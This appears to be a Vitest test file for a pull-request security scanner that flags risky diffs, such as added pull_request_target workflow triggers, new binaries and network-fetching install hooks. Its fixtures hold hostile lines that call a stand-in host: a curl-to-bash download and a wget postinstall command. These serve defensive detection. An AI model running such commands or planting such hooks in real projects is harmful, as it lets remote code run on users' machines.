import { describe, expect, it } from 'vitest'
import { scanPullSecurity } from './security.ts'

describe('scanPullSecurity', () => {
  it('is clean for a normal source patch', () => {
    expect(
      scanPullSecurity([
        {
          path: 'packages/ai/src/chat.ts',
          patch: '@@ -1,2 +1,3 @@\n line\n+return messages\n',
        },
      ]),
    ).toEqual({ ok: true, reasons: [] })
  })

  it('alerts on pull_request_target in a workflow', () => {
    expect(
      scanPullSecurity([
        {
          path: '.github/workflows/ci.yml',
          patch:
            '@@ -1,2 +1,4 @@\n on:\n+  pull_request_target:\n+    types: [opened]\n',
        },
      ]),
    ).toEqual({
      ok: false,
      reasons: ['.github/workflows/ci.yml: adds pull_request_target'],
    })
  })

  it('alerts on curl piped to a shell', () => {
    expect(
      scanPullSecurity([
        {
          path: 'scripts/setup.sh',
          patch:
            '@@ -1 +1,2 @@\n #!/bin/sh\n+curl https://evil.example/x.sh | bash\n',
        },
      ]),
    ).toEqual({
      ok: false,
      reasons: ['scripts/setup.sh: shell download or reverse shell'],
    })
  })

  it('alerts on a package.json postinstall that fetches the network', () => {
    expect(
      scanPullSecurity([
        {
          path: 'packages/ai/package.json',
          patch:
            '@@ -1,3 +1,4 @@\n {\n+  "postinstall": "wget https://evil.example/x.js"\n }\n',
        },
      ]),
    ).toEqual({
      ok: false,
      reasons: [
        'packages/ai/package.json: "postinstall": "wget https://evil.example/x.js" fetches the network',
      ],
    })
  })

  it('alerts on a new binary path', () => {
    expect(
      scanPullSecurity([{ path: 'tools/helper.exe', patch: null }]),
    ).toEqual({
      ok: false,
      reasons: ['tools/helper.exe: new binary or script payload'],
    })
  })

  it('ignores pull_request_target on a deleted line', () => {
    expect(
      scanPullSecurity([
        {
          path: '.github/workflows/ci.yml',
          patch: '@@ -1,2 +1,1 @@\n-  pull_request_target:\n on:\n',
        },
      ]),
    ).toEqual({ ok: true, reasons: [] })
  })
})
